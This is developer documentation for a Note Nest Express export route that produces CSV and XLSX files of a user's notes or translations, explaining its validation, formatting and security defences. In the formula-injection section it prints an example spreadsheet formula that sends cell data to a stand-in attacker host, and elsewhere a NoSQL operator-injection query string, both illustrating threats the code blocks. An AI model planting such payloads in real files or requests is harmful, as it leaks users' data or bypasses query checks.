# EXPORT ROUTES - [`exportRoutes.js`](../server/routes/exportRoutes.js) BREAKDOWN

[`exportRoutes.js`](../server/routes/exportRoutes.js) is the Express router that lets a user **download their notes or translations as a spreadsheet** (`.csv` or `.xlsx`). It accepts the same filters as the list pages, so **what the user sees in a filtered list is what they get in the file**.

```
React (ExportForm)  ──►  GET /export?type=notes&format=xlsx&notebook=...
                                     │
                                     ▼
                     validate → build Mongo filter → fetch → rows → file
                                     │
React  ◄── file download (Content-Disposition: attachment; filename="note-nest-notes-2026-11-13.xlsx")
```

---

## TABLE OF CONTENTS
1. [ROUTE SUMMARY](#1-route-summary)
     - [1.1. GET `/export`: THE ROUTE](#11-get-export-the-route)
     - [1.2. CALLING THE ROUTE FROM REACT](#12-calling-the-route-from-react)
2. [IMPORTS AND SETUP](#2-imports-and-setup)
3. [SCHEMAS](#3-schemas)
     - [3.1. NOTE SCHEMA](#31-note-schema-noteschemajs)
     - [3.2. TRANSLATION SCHEMA](#32-translation-schema-translationschemajs)
4. [UTILITY FUNCTIONS](#4-utility-functions)
     - [4.1. EXPORT CONFIG](#41-export-config)
     - [4.2. FILTERS](#42-filters)
     - [4.3. FORMATTING](#43-formatting)
     - [4.4. CELL CLEANING: `safeCell()` AND `capCell()`](#44-cell-cleaning-safecell-and-capcell)
     - [4.5. FILE BUILDERS](#45-file-builders)
5. [SECURITY](#5-security)
     - [5.1. PACKAGES](#51-packages)
     - [5.2. MIDDLEWARE](#52-middleware)
     - [5.3. SECURITY MEASURES IN THIS FILE](#53-security-measures-in-this-file)
6. [STATUS CODE REFERENCES](#6-status-code-references)
7. [KNOWN GAPS AND HOUSE KEEPING](#7-known-gaps-and-house-keeping)
     - [7.1. GAPS](#71-gaps)
     - [7.2. HOUSE KEEPING](#72-house-keeping)
8. [REFERENCES](#8-references)

- *View [GLOSSARY.md](../GLOSSARY.md) for terminology*

---

<!-- SECTION 1 -->
## 1. ROUTE SUMMARY

The router is mounted at **`/export`** by [`app.js`](../server/app.js). There's a **single route**.

| Method | Path | Middleware | Purpose |
|---|---|---|---|
| `GET` | `/export` | `exportLimiter`, `checkJwtToken` | Download notes or translations as `.csv` / `.xlsx` |

**Client side usage:**

| Method | Full Path | Frontend/Client side files |
|---|---|---|
| `GET` | `/export` | [ExportForm.js](../client/src/components/ExportForm.js), shown by [NotesList.js](../client/src/components/NotesList.js) and [TranslationsList.js](../client/src/components/TranslationsList.js) |

#### Query parameters

| Param | Required | Applies To | Values |
|---|---|---|---|
| `type` | ✅ | all | `notes` \| `translations` (the keys of `EXPORTS`) |
| `format` | ✅ | all | `csv` \| `xlsx` (the keys of `FILE_FORMATS`) |
| `language` | ❌ | notes | A language code, e.g. `af` |
| `notebook` | ❌ | notes | A notebook ObjectId |
| `tag` | ❌ | notes | A tag ObjectId |
| `sourceLanguage` | ❌ | translations | A language code |
| `targetLanguage` | ❌ | translations | A language code |

An empty optional filter (`?language=`) means **"any"**, the same as leaving it out. A filter that doesn't apply to the chosen `type` (e.g. `tag` with `type=translations`) is ignored.

#### Limits

- At most **`MAX_EXPORT_ROWS` (10,000) rows** per file. If there were more, the response says so in the `X-Export-Truncated` header ([Step 4](#step-4-fetch-with-the-row-cap)).
- Rate-limited **per IP** by `exportLimiter` (60 exports per 15 minutes), because an export is a heavy request (database query + file build).

#### Examples

```
GET /export?type=notes&format=xlsx
GET /export?type=notes&format=csv&notebook=6732a1f0c2b3d4e5f6071829&tag=6732a1f0c2b3d4e5f607182a
GET /export?type=translations&format=xlsx&sourceLanguage=af&targetLanguage=en
```

**Why `GET`?** An export only **reads** data, and a GET URL can be used directly as a download link (see [1.2](#12-calling-the-route-from-react)).

---

### 1.1. GET `/export`: THE ROUTE

#### Flow

```
exportLimiter ───► 429 if too many exports
checkJwtToken ───► 401 if not logged in
     ▼
type valid?   ───► 400 "Invalid export type"
format valid? ───► 400 "Invalid export format"
     ▼
buildFilter() ───► 400 "Invalid language code" / "Invalid notebook id" / "Invalid tag id"
     ▼
fetch(filter, MAX + 1) → truncated? → toRows() → build()
     ▼
filename + headers → 200 file
```

#### Step 1: Validate `type`

```js
const exportType = typeof type === 'string' && Object.hasOwn(EXPORTS, type) ? EXPORTS[type] : null;
if (!exportType) → 400 "Invalid export type"
```

**Why `Object.hasOwn` and not just `EXPORTS[type]`?** Every object inherits properties from `Object.prototype`:

| `type` | `EXPORTS[type]` | `Object.hasOwn(EXPORTS, type)` |
|---|---|---|
| `'notes'` | the notes config | `true` ✅ |
| `'toString'` | **a function** (inherited) | `false` ✅ |
| `'constructor'` | **the `Object` function** | `false` ✅ |
| `'__proto__'` | **`Object.prototype`** | `false` ✅ |

Without `hasOwn`, `?type=toString` would pass the check and crash later with a 500. `Object.hasOwn` requires Node **16.9+**.

#### Step 2: Validate `format`

```js
const fileFormat = typeof format === 'string' && Object.hasOwn(FILE_FORMATS, format) ? FILE_FORMATS[format] : null;
if (!fileFormat) → 400 "Invalid export format"
```

The same pattern as `type`. An array (`?format=csv&format=xlsx`) or an object fails the string check.

#### Step 3: Build the filter

```js
const { filter, error } = exportType.buildFilter(userId, req.query);
if (error) → 400 error
```

`buildFilter` returns **either** `{ filter }` **or** `{ error }`, never both, and it never throws. Destructuring both makes the check one line. See [4.1. EXPORT CONFIG](#41-export-config).

#### Step 4: Fetch with the row cap

```js
const fetched = await exportType.fetch(filter, MAX_EXPORT_ROWS + 1);
const truncated = fetched.length > MAX_EXPORT_ROWS;
const docs = truncated ? fetched.slice(0, MAX_EXPORT_ROWS) : fetched;
```

Asking for **one more row than the cap** is a cheap way to find out whether there were more rows, without a separate `countDocuments()` query. If the extra row comes back, the file is cut at `MAX_EXPORT_ROWS` and `truncated` is `true`, which the response reports in a header ([Step 7](#step-7-response-headers)).

#### Step 5: Build the file

```js
const rows = toRows(docs, exportType.columns, fileFormat.cleanCell);
const file = fileFormat.build(rows, exportType.sheetName);
```

If nothing matches the filter, the file still downloads, with **headers only**. That's not an error. See [4.5. FILE BUILDERS](#45-file-builders).

#### Step 6: Build the filename

```js
const filtered = Object.keys(filter).some((key) => !['user', 'isArchived', 'deletedAt'].includes(key));
const filename = `note-nest-${type}${filtered ? '-filtered' : ''}-${todayDate()}.${format}`;
```

`filtered` is `true` if the filter has **any key besides the fixed ones**, i.e. the user applied a filter:

| Filter Keys | `filtered` | Filename |
|---|---|---|
| `user, isArchived, deletedAt` | `false` | `note-nest-notes-2026-11-13.xlsx` |
| `user, isArchived, deletedAt, tags` | `true` | `note-nest-notes-filtered-2026-11-13.xlsx` |
| `user, isArchived, deletedAt, sourceLanguage` | `true` | `note-nest-translations-filtered-2026-11-13.csv` |

The filename is built **only** from validated values (`type` and `format` are whitelisted, and the date is generated by the server), so it can't be used to inject extra headers.

#### Step 7: Response headers

```js
res.set({
    'Content-Type': fileFormat.contentType,
    'Content-Disposition': `attachment; filename="${filename}"`,
    'Content-Length': file.length,
    'Cache-Control': 'no-store',
    'X-Export-Rows': String(docs.length),
    'X-Export-Truncated': String(truncated),
});
return res.status(200).send(file);
```

| Header | Purpose |
|---|---|
| `Content-Type` | What the file is |
| `Content-Disposition: attachment` | **Download** the file instead of displaying it, using this filename |
| `Content-Length` | The size in bytes (`file` is a Buffer, so `.length` is bytes). Lets the browser show download progress. |
| `Cache-Control: no-store` | The file holds private data. Browsers and proxies must not keep a copy. |
| `X-Export-Rows` | How many data rows are in the file |
| `X-Export-Truncated` | `'true'` if there were more than `MAX_EXPORT_ROWS` rows and the file was cut short, otherwise `'false'` |

---

### 1.2. CALLING THE ROUTE FROM REACT

`ExportForm.js` (shown by `NotesList.js` and `TranslationsList.js`) uses **fetch + blob**, so it can show error messages and the truncation warning instead of opening a JSON page:

```js
const params = new URLSearchParams({ type, format });
if (exportFiltered) {
    exportType.filterKeys.forEach((key) => { if (filters[key]) params.set(key, filters[key]) });// Only filters with a value
}
const response = await fetch(`/export?${params.toString()}`, { method: 'GET', credentials: 'include' });// Send the auth cookie
if (!response.ok) {
    const data = await response.json().catch(() => ({}));// Errors come back as JSON
    throw new Error(data.message || 'Export failed.');
}
const blob = await response.blob();
const filename = filenameFromHeader(response.headers.get('Content-Disposition'))
    || `${exportType.filename}${exportFiltered ? '-filtered' : ''}.${format}`;// Fallback if the header can't be read
// ...create a temporary <a download>, click it, then revoke the object URL

const truncated = response.headers.get('X-Export-Truncated') === 'true';
const rowCount = Number(response.headers.get('X-Export-Rows')) || 0;
setNotice(truncated
    ? `${filename} downloaded. Only the first ${rowCount.toLocaleString()} rows were exported. Apply a filter to export the rest.`
    : `${filename} downloaded.`);
```

| Piece | From | Purpose |
|---|---|---|
| `EXPORT_TYPES[type].filterKeys` | [formUtil.js](../client/src/util/formUtil.js) | Which list filters to send for each type (`language`, `notebook`, `tag` / `sourceLanguage`, `targetLanguage`) |
| `filenameFromHeader()` | [formUtil.js](../client/src/util/formUtil.js) | Reads the filename out of `Content-Disposition` |
| Scope select | `ExportForm.js` | When the list is filtered, the user can export the **filtered list** or **all** rows |

The frontend and API are on the **same origin** (the React dev server proxies to the API), so the browser lets the code read `Content-Disposition` and the `X-Export-*` headers. If the API is ever served from a **different origin**, the server must also send `Access-Control-Expose-Headers: Content-Disposition, X-Export-Rows, X-Export-Truncated`. Otherwise `response.headers.get(...)` returns `null`, and the download falls back to the client's filename with no truncation warning.

---

<!-- SECTION 2 IMPORTS AND SETUP-->
## 2. IMPORTS AND SETUP

```js
const express = require('express');
const mongoose = require('mongoose');
const XLSX = require('xlsx');
const { stringify } = require('csv-stringify/sync');
const Note = require('../models/noteSchema');
const Translation = require('../models/translationSchema');
const { checkJwtToken } = require('../middleware/securityMiddleware');
const { exportLimiter } = require('../middleware/rateLimitMiddleware');
const { languageCodeRegex } = require('../util/schemaUtil');
const { languageData } = require('../util/languageData');
const { MAX_EXPORT_ROWS, EXPORT_TIME_ZONE } = require('../util/apiUtil');
const router = express.Router();

const EXCEL_MAX_CELL_CHARS = 32767;
const UTF8_BOM = '﻿';// U+FEFF, currently typed as the invisible character itself
```

| Import / Constant | From | Used For |
|---|---|---|
| `express` | npm | Creates the `router` |
| `mongoose` | npm | `ObjectId.isValid()` for the `notebook` and `tag` filters |
| `XLSX` | npm `xlsx` (SheetJS) | Builds the `.xlsx` workbook in memory |
| `stringify` | npm `csv-stringify/sync` | Turns rows into CSV text. It handles quoting of commas, quotes and line breaks. |
| `Note`, `Translation` | [models](../server/models/) | The two collections that can be exported ([section 3](#3-schemas)) |
| `checkJwtToken` | [securityMiddleware](../server/middleware/securityMiddleware.js) | Only logged-in users can export, and only their own data |
| `exportLimiter` | [rateLimitMiddleware](../server/middleware/rateLimitMiddleware.js) | Exports are heavy, so they're rate-limited separately |
| `languageCodeRegex` | [util/schemaUtil](../server/util/schemaUtil.js) | Validates the language filters, using the same rule as the schemas |
| `languageData` | [util/languageData](../server/util/languageData.js) | Shows `Afrikaans` instead of `af` in the file |
| `MAX_EXPORT_ROWS` | [util/apiUtil](../server/util/apiUtil.js) | The maximum number of rows per file (10,000) |
| `EXPORT_TIME_ZONE` | [util/apiUtil](../server/util/apiUtil.js) | `'Africa/Johannesburg'`. Dates in the file and the filename use South African time. |
| `EXCEL_MAX_CELL_CHARS` | this file | Excel's per-cell limit, used by `capCell()` |
| `UTF8_BOM` | this file | The byte order mark at the start of every CSV ([4.5](#buildcsv)) |

`dotenv` isn't imported. `app.js` loads it before any router is required.

**Packages to install:**

```bash
npm install xlsx csv-stringify
```

---

<!-- SECTION 3: SCHEMAS -->
## 3. SCHEMAS

This router only **reads** notes and translations. It never changes them. Both lists use `.lean()`, so the result is plain objects and the schemas' `toJSON` transforms don't run; the `.select(...)` lists decide exactly which fields are loaded.

### 3.1. NOTE SCHEMA ([noteSchema.js](../server/models/noteSchema.js))

| Field | Used For |
|---|---|
| `user`, `isArchived`, `deletedAt` | The filter: the user's **active** notes only |
| `language`, `notebook`, `tags` | The optional filters |
| `title`, `plainText` | The Title and Content columns (`plainText` is generated from the HTML `content` by the schema hook) |
| `notebook` → Notebook `name` | The Notebook column (populated) |
| `tags` → Tag `name` | The Tags column (populated) |
| `isPinned`, `updatedAt` | The sort order and the Pinned / Last Updated columns |
| `createdAt` | The Date Added column |

The sort `{ isPinned: -1, updatedAt: -1 }` uses the `{ user: 1, isPinned: -1, updatedAt: -1 }` index, the same one the Notes list uses.

### 3.2. TRANSLATION SCHEMA ([translationSchema.js](../server/models/translationSchema.js))

| Field | Used For |
|---|---|
| `user`, `isArchived`, `deletedAt` | The filter: the user's **active** translations only |
| `sourceLanguage`, `targetLanguage` | The optional filters, and the language columns |
| `sourceText`, `translatedText` | The text columns |
| `note` → Note `title` | The Note column (populated) |
| `characterCount` | The Characters column (set by the schema hook) |
| `createdAt` | The sort order and the Date Added column |

The sort `{ createdAt: -1 }` uses the `{ user: 1, createdAt: -1 }` index, the same one the Translations list uses. `textHash` isn't in the `.select(...)` list, so it's never loaded.

The full field lists are in [NOTE_ROUTES.md](NOTE_ROUTES.md) and [TRANSLATION_ROUTES.md](TRANSLATION_ROUTES.md#311-translation-schema).

---

<!-- SECTION 4: UTILITY FUNCTIONS -->
## 4. UTILITY FUNCTIONS

### 4.1. EXPORT CONFIG

#### The `EXPORTS` object

Rather than writing an `if (type === 'notes') ... else ...` block, each export type is described **as data**. The route reads whichever entry matches `type`.

```js
const EXPORTS = {
    notes:        { sheetName, buildFilter, fetch, columns },
    translations: { sheetName, buildFilter, fetch, columns },
};
```

| Key | Type | Purpose |
|---|---|---|
| `sheetName` | string | The worksheet tab name in `.xlsx` |
| `buildFilter(userId, query)` | function | Validates the query and returns `{ filter }` or `{ error }` |
| `fetch(filter, limit)` | function | Runs the Mongo query (up to `limit` rows) and returns plain objects |
| `columns` | array | `[header, (doc) => cellValue]` pairs that define the columns |

**Adding a new export type** (e.g. `notebooks`) means adding one entry here. The route doesn't change.

#### `EXPORTS.notes`

**Filter:** the same as `GET /notes/fetchNotes`.

```js
const filter = { user: userId, isArchived: false, deletedAt: null };
if (language) filter.language = language;
if (notebook) filter.notebook = notebook;
if (tag) filter.tags = tag;
```

| Part | Meaning |
|---|---|
| `user: userId` | Only the user's own notes |
| `isArchived: false, deletedAt: null` | **Active notes only.** Archived and trashed notes aren't exported. |
| `filter.tags = tag` | On an **array** field, MongoDB matches documents whose array **contains** that value |

**Query:**

```js
Note.find(filter)
    .sort({ isPinned: -1, updatedAt: -1 })// Pinned first, then newest — same as the NotesList table
    .limit(limit)
    .select('title plainText language notebook tags isPinned createdAt updatedAt')
    .populate('notebook', 'name')
    .populate('tags', 'name')
    .lean()
```

`plainText` is selected instead of the editor's HTML, so cells contain readable text instead of `<p><strong>...</strong></p>`.

**Columns:**

| Header | Value |
|---|---|
| Title | `n.title` |
| Content | `n.plainText` |
| Language | `languageName(n.language)` → `Afrikaans` |
| Notebook | `n.notebook?.name` (blank if there's no notebook) |
| Tags | Tag names joined with `, ` → `work, urgent` |
| Pinned | `Yes` / `No` |
| Date Added | `formatDate(n.createdAt)` (SAST) |
| Last Updated | `formatDate(n.updatedAt)` (SAST) |

The Tags column breaks down like this:

```js
(n.tags || [])// Guard against a missing array
    .map((t) => t?.name)// Populated tag -> name
    .filter(Boolean)// Drop tags that were deleted (populate gives null)
    .join(', ')// One cell: "work, urgent"
```

#### `EXPORTS.translations`

**Filter:** the same as `GET /translation/fetch`.

```js
const filter = { user: userId, isArchived: { $ne: true }, deletedAt: null };
if (sourceLanguage) filter.sourceLanguage = sourceLanguage;
if (targetLanguage) filter.targetLanguage = targetLanguage;
```

| Part | Meaning |
|---|---|
| `isArchived: { $ne: true }, deletedAt: null` | **Active translations only.** `$ne: true` also matches older translations saved before the field existed. |

**Query:** newest first (`createdAt: -1`, the same as the TranslationsList table), selecting `sourceText translatedText sourceLanguage targetLanguage characterCount note createdAt`, with the linked note's title populated.

**Columns:**

| Header | Value |
|---|---|
| Source Text | `t.sourceText` |
| Source Language | `languageName(t.sourceLanguage)` |
| Translated Text | `t.translatedText` |
| Target Language | `languageName(t.targetLanguage)` |
| Note | `t.note?.title` (blank if it isn't linked to a note) |
| Characters | `t.characterCount ?? ''` |
| Date Added | `formatDate(t.createdAt)` (SAST) |

`??` vs `||`: `characterCount ?? ''` keeps a real `0`. `|| ''` would turn `0` into a blank cell.

#### The `FILE_FORMATS` map

```js
const FILE_FORMATS = {
    csv:  { contentType: 'text/csv; charset=utf-8', cleanCell: safeCell, build: (rows) => buildCsv(rows) },
    xlsx: { contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', cleanCell: capCell, build: (rows, sheetName) => buildXlsx(rows, sheetName) },
};
```

| Key | Purpose |
|---|---|
| `contentType` | The MIME type. It tells the browser it's a download and lets the operating system pick the right app. |
| `cleanCell` | The cell cleaner for this format ([4.4](#44-cell-cleaning-safecell-and-capcell)) |
| `build(rows, sheetName)` | Builds the file as a Buffer ([4.5](#45-file-builders)) |

The route validates `format` **against this map**, so the allowed formats, their MIME types and their builders can't drift apart. Adding a format (e.g. `json`) means adding one entry here; until then, `?format=json` is a 400.

### 4.2. FILTERS

```js
const isValidLanguage = (value) => value === undefined || value === ''
    || (typeof value === 'string' && languageCodeRegex.test(value));

const isValidId = (value) => value === undefined || value === ''
    || (typeof value === 'string' && mongoose.Types.ObjectId.isValid(value));
```

Both helpers follow the same rule: **missing or empty is allowed** (meaning "no filter"), otherwise the value must be a valid string.

| Helper | Used For | Error |
|---|---|---|
| `isValidLanguage` | `language`, `sourceLanguage`, `targetLanguage` | "Invalid language code" |
| `isValidId` | `notebook`, `tag` | "Invalid notebook id" / "Invalid tag id" |

**Why the `typeof === 'string'` check matters.** Express parses query strings with the `qs` library, which can turn the URL into **arrays and objects**:

| URL | `req.query.notebook` |
|---|---|
| `?notebook=abc` | `'abc'` |
| `?notebook=a&notebook=b` | `['a', 'b']` |
| `?notebook[$ne]=x` | `{ $ne: 'x' }` ← a Mongo operator |

Without the type check, `filter.notebook = { $ne: 'x' }` would be a **NoSQL injection**. The string check rejects arrays and objects with a 400.

### 4.3. FORMATTING

#### `LANGUAGE_NAMES` + `languageName()`

```js
const LANGUAGE_NAMES = Object.fromEntries(languageData.map(({ code, name }) => [code, name]));
const languageName = (code) => (code ? (LANGUAGE_NAMES[code] || code) : '');
```

This does the same job as the `reduce` in `apiRoutes.js`, written differently:

```js
languageData.map(({ code, name }) => [code, name])// [['af','Afrikaans'], ['zu','Zulu']]
Object.fromEntries(...)// { af: 'Afrikaans', zu: 'Zulu' }
```

| Input | Output |
|---|---|
| `'af'` | `'Afrikaans'` |
| `'xx'` (unknown) | `'xx'`, the code itself |
| `undefined` / `''` | `''`, an empty cell |

#### `formatDate()` and `todayDate()`

```js
const formatDate = (date) => (date ? new Date(date).toLocaleString('sv-SE', { timeZone: EXPORT_TIME_ZONE }) : '');
const todayDate = () => new Date().toLocaleDateString('sv-SE', { timeZone: EXPORT_TIME_ZONE });
```

| Function | Example | Used For |
|---|---|---|
| `formatDate(note.createdAt)` | `2026-11-09 16:03:22` | The "Date Added" and "Last Updated" cells |
| `todayDate()` | `2026-11-13` | The date in the filename |

Dates are stored in MongoDB as **UTC**. South Africa is **UTC+2**, so converting with `timeZone: 'Africa/Johannesburg'` shows the time the user actually saw, and an export made just after midnight gets **today's** date in the filename, not yesterday's.

**Why `sv-SE`?** The Swedish locale happens to format dates as `YYYY-MM-DD HH:mm:ss`. That's readable, sorts correctly as text, and spreadsheet apps recognise it as a date. It's a common trick; the language of the file isn't affected. (This needs Node's full ICU data, which is the default since Node 13.)

### 4.4. CELL CLEANING: `safeCell()` AND `capCell()`

Each file format needs a different clean-up on its data cells. The right one is chosen by `FILE_FORMATS` ([4.1](#the-file_formats-map)).

| Format | Cleaner | Why |
|---|---|---|
| `csv` | `safeCell()` | Formula injection is a CSV problem |
| `xlsx` | `capCell()` | `.xlsx` cells are always text, but Excel rejects cells over 32,767 characters |

#### `safeCell()`: formula injection protection (CSV)

```js
const safeCell = (value) => {
    if (typeof value !== 'string') return value;
    return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
};
```

**The attack.** Spreadsheet apps treat a CSV cell that starts with `=`, `+`, `-` or `@` as a **formula**. If a user saves a note titled:

```
=HYPERLINK("http://evil.example/?d="&A2, "Click me")
```

then opening the exported CSV in Excel could run that formula. That can **leak data** from other cells, or, in older setups, run commands. This is known as **CSV / formula injection** (OWASP).

**The fix.** A leading apostrophe `'` tells Excel to treat the cell as **text**:

| Original | Exported |
|---|---|
| `=SUM(A1:A9)` | `'=SUM(A1:A9)` |
| `+27 82 123 4567` | `'+27 82 123 4567` |
| `- buy milk` | `'- buy milk` |
| `Shopping list` | `Shopping list` (unchanged) |
| `42` (number) | `42` (non-strings pass through) |

| Regex Part | Matches |
|---|---|
| `^` | Start of the string only |
| `[=+\-@\t\r]` | `=`, `+`, `-` (escaped), `@`, tab, carriage return |

Tab and carriage return are included because some apps strip leading whitespace **before** deciding whether a cell is a formula.

**Why not for `.xlsx`?** SheetJS's `aoa_to_sheet` stores JavaScript strings as **text cells** (type `s`, with no formula), so Excel never runs them. Adding the apostrophe there would only make it **show up in the cell** (`'- todo`).

#### `capCell()`: Excel's cell limit (`.xlsx`)

```js
const capCell = (value) => (typeof value === 'string' && value.length > EXCEL_MAX_CELL_CHARS
    ? value.slice(0, EXCEL_MAX_CELL_CHARS)
    : value);
```

An Excel cell can hold at most **32,767 characters**. A longer note's `plainText` would make Excel report the file as damaged and offer to "repair" it. `capCell` cuts the text to the limit so the file always opens. CSV files keep the **full** text (see [7.1. GAPS](#71-gaps)).

### 4.5. FILE BUILDERS

#### `toRows()`: documents → a 2-D array

```js
const toRows = (docs, columns, cleanCell) => [
    columns.map(([header]) => header),// Row 1: headers
    ...docs.map((doc) => columns.map(([, getValue]) => cleanCell(getValue(doc) ?? ''))),// Row 2+: data
];
```

The output is an **array of arrays** (often called "AOA"), which both CSV and XLSX can use:

```js
[
  ['Title', 'Content', 'Language', ...],
  ['Shopping list', 'Milk, eggs', 'English', ...],
  ['Vergadering', 'Notas...', 'Afrikaans', ...],
]
```

| Syntax | Meaning |
|---|---|
| `([header]) =>` | Takes only the first item of each `[header, fn]` pair |
| `([, getValue]) =>` | **Skips** the first item (the leading comma) and takes the function |
| `getValue(doc) ?? ''` | `null`/`undefined` becomes an empty cell |
| `cleanCell(...)` | The format's cleaner on **every** data cell: `safeCell` for CSV, `capCell` for `.xlsx` |

#### `buildCsv()`

```js
const buildCsv = (rows) => Buffer.from(UTF8_BOM + stringify(rows), 'utf8');
```

| Piece | Why |
|---|---|
| `stringify(rows)` | Builds proper CSV: values containing `,`, `"` or line breaks are wrapped in quotes and inner quotes are doubled |
| `UTF8_BOM` | The **byte order mark**. Without it, Excel guesses the encoding and garbles characters like `ê`, `ô`, `ñ` or non-Latin scripts (e.g. `môre` → `mÃ´re`). |
| `Buffer.from(..., 'utf8')` | Converts to bytes, so `Content-Length` is in **bytes**, not characters |

#### `buildXlsx()`

```js
const sheet = XLSX.utils.aoa_to_sheet(rows);// 2-D array -> worksheet
sheet['!cols'] = rows[0].map((_, col) => ({
    wch: Math.min(Math.max(...rows.map((row) => String(row[col] ?? '').length), 10), 60),
}));
const workbook = XLSX.utils.book_new();// Empty workbook
XLSX.utils.book_append_sheet(workbook, sheet, sheetName);// Add the sheet as "Notes" / "Translations"
return XLSX.write(workbook, { type: 'buffer', bookType: 'xlsx' });// Node Buffer
```

**How the column widths are worked out** (`wch` = width in characters):

```
longest = Math.max(...lengths of every cell in this column)
width   = Math.min( Math.max(longest, 10), 60 )
                    └─ at least 10 ─┘   └─ at most 60
```

So short columns don't get squashed, and a long `Content` column doesn't stretch across the whole screen.

---

<!-- SECTION 5: ROUTER SECURITY -->
## 5. SECURITY

### 5.1. PACKAGES

| Package | Where | Security role |
|---|---|---|
| `jsonwebtoken` | `securityMiddleware.js` | Verifies the session JWT in `checkJwtToken` |
| `express-rate-limit` | `rateLimitMiddleware.js` | `exportLimiter`: limits how many heavy exports one IP can run |
| `cookie-parser` | `app.js` | Reads the HTTP-only `token` cookie into `req.cookies` |
| `csv-stringify` | `exportRoutes.js` | Correct CSV quoting, so a value can't break out of its cell |

### 5.2. MIDDLEWARE

| Middleware | File | Routes | What it does |
|---|---|---|---|
| `exportLimiter` | [rateLimitMiddleware.js](../server/middleware/rateLimitMiddleware.js) | `GET /` | **429** after 60 exports per 15 minutes per IP ("Too many exports, please try again in 15 minutes") |
| `checkJwtToken` | [securityMiddleware.js](../server/middleware/securityMiddleware.js) | `GET /` | **401** if the cookie is missing, the token is invalid or expired, the user no longer exists, or the session was signed out. **500** if the user lookup fails. Sets `req.user`. |

**Order:**

```js
router.get('/', exportLimiter, checkJwtToken, async (req, res) => { ... });
```

```
Request → exportLimiter → checkJwtToken → route handler
              │                │
              └─ 429           └─ 401 if not logged in
```

The **rate limiter goes first**, so a flood of requests is rejected cheaply, before JWT verification and the database lookup it does.

### 5.3. SECURITY MEASURES IN THIS FILE

| Measure | Where | Protects Against |
|---|---|---|
| `user: userId` from the token in every filter | `buildFilter` | Exporting another user's data |
| `typeof === 'string'` on every query value | `isValidLanguage`, `isValidId`, Step 1–2 | NoSQL operator injection (`?notebook[$ne]=x`), arrays |
| `Object.hasOwn` whitelist for `type` and `format` | Step 1–2 | Prototype keys (`toString`, `__proto__`) reaching the code |
| `safeCell()` on every CSV cell | `FILE_FORMATS.csv` | CSV / formula injection |
| `capCell()` on every `.xlsx` cell | `FILE_FORMATS.xlsx` | A corrupt file from over-long cells |
| Only active notes and translations | `buildFilter` | Exporting trashed or archived data the user can't see in the list |
| `MAX_EXPORT_ROWS` cap + `exportLimiter` | Step 4, middleware | Memory and CPU exhaustion |
| Filename built only from validated values | Step 6 | Header injection through `Content-Disposition` |
| `Cache-Control: no-store` | Step 7 | Private data cached by browsers or proxies |
| `try / catch` → `500 "Internal Server Error"` | Route | Internal error details reaching the client |

---

<!-- SECTION 6 -->
## 6. STATUS CODE REFERENCES

| Code | When |
|---|---|
| `200` | File sent (possibly headers only, if nothing matched; check `X-Export-Truncated` for a cut-short file) |
| `400` | Invalid `type`, `format`, language code, notebook ID or tag ID |
| `401` | (From `checkJwtToken`) Not logged in, or the token is invalid, expired or signed out |
| `429` | (From `exportLimiter`) More than 60 exports in 15 minutes |
| `500` | Database or file-building error, or a failed user lookup in `checkJwtToken` |

---

<!-- SECTION 7 -->
## 7. KNOWN GAPS AND HOUSE KEEPING

### 7.1. GAPS

These gaps were found in an earlier review and have now been fixed.

| Gap | Fix | Where |
|---|---|---|
| 1. The formula-injection apostrophe showed up in `.xlsx` files | `safeCell` only runs for CSV. `toRows` takes the cleaner from `FILE_FORMATS`. Checked: SheetJS stores `=SUM(...)` and `- todo` as text cells (`t: "s"`, no formula). | `exportRoutes.js` `toRows`, `FILE_FORMATS` |
| 2. Truncation at `MAX_EXPORT_ROWS` was silent | The route fetches `MAX_EXPORT_ROWS + 1` rows. If the extra row comes back, the file is cut at the cap and `X-Export-Truncated: true` is sent with `X-Export-Rows`. `ExportForm.js` shows "Only the first 10,000 rows were exported. Apply a filter to export the rest." | `exportRoutes.js` GET `/`, `ExportForm.js` |
| 3. Dates were UTC, not South African time | `formatDate()` and the filename date (`todayDate()`) use `EXPORT_TIME_ZONE` (`Africa/Johannesburg`) with the `sv-SE` format. A note saved at 16:03 SAST shows as `16:03:22`, not `14:03:22`. | `exportRoutes.js`, `util/apiUtil.js` |
| 4. Excel's 32,767-character cell limit | `capCell()` cuts `.xlsx` cell text to `EXCEL_MAX_CELL_CHARS`, so the file always opens | `exportRoutes.js` |
| 5. `FORMATS` and `CONTENT_TYPES` could drift apart | Replaced by one `FILE_FORMATS` map (content type, cleaner and builder per format). The route validates `format` against it with `Object.hasOwn`. `FORMATS` is removed from `apiUtil.js`. | `exportRoutes.js`, `util/apiUtil.js` |

**Still open:**

| Item | Notes |
|---|---|
| 6. The whole file is built in memory | The result set, the rows array and the finished file all sit in memory before sending. `MAX_EXPORT_ROWS` and `exportLimiter` keep that manageable. Streaming (Mongo cursor → `csv-stringify` stream → `res`) is only worth the extra complexity if the limit grows into the tens of thousands. |
| 7. Very long text in CSV | CSV files keep the **full** text, so other apps get everything. Excel can't show more than 32,767 characters in one cell either way: opening such a CSV in **Excel** splits or cuts that cell, while the `.xlsx` export cuts it cleanly so the file opens without a "repair" prompt. |
| 8. A cut `.xlsx` cell isn't marked | `capCell` cuts silently. If very long notes become common, add a marker such as `…[truncated]` (keeping the total within the limit). |

### 7.2. HOUSE KEEPING

**Done:**

| Issue | What changed |
|---|---|
| Unused `require('dotenv').config()` | Removed (`app.js` loads it) |
| `apiUtil` import and `express.Router()` | Now have a comment and a semicolon |
| "Conditional rendering" comments | Changed to "Guard clause" |
| The header block | Mentions `MAX_EXPORT_ROWS`, the truncation header and the rate limiter |
| Dead code in `apiUtil.js` | Removed copies of `safeCell`, `toRows`, `buildCsv`, `buildXlsx` and `CONTENT_TYPES` that nothing imported. They were also broken, because `apiUtil.js` never imported `stringify` or `XLSX`, so calling them would have thrown a `ReferenceError`. The working versions live only in `exportRoutes.js`. |

**Still to do:**

| Issue | Where | Change |
|---|---|---|
| `UTF8_BOM` holds the **invisible** BOM character (bytes `EF BB BF`), so it looks like `''` in an editor and could be stripped without anyone noticing | `exportRoutes.js` line 27 | Write it as the escape `'﻿'` |
| The `exportLimiter` 429 body includes `success: false`; every route error in this file is just `{ message }` | `rateLimitMiddleware.js`, `exportLimiter` | Drop `success: false` so `ExportForm.js` gets one error shape (it only reads `message`, so nothing breaks either way) |
| The comments in `ExportForm.js` still say "Conditional rendering" | `client/src/components/ExportForm.js` | "Guard clause" / "Check", to match the server |

---

